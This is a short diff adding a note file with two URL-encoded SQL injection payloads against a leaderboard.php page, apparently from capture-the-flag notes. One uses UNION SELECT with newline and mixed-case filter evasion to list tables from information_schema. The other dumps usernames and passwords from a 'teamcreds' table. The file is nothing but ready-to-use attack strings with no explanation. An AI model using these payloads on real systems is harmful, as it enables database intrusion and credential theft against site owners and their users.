@@ -1,0 +1,5 @@
+To see tables
+/leaderboard.php?name=%%27%0AuNion%0AsELEct%0Atable_schema,%0Atable_name,%0A1%0AAS%0Apoints%0AFROM%0Ainformation_schema.tables%0AWHERE%0Atable_name%0ALIKE%0A%27%
+
+To see creds
+/leaderboard.php?name=%%27%0AUnION%0ASElECT%0Ausername,%0Apassword,%0A1%0AFROM%0A%0Ateamcreds%0AWHERE%0Ausername%0ALIKE%0A%27%
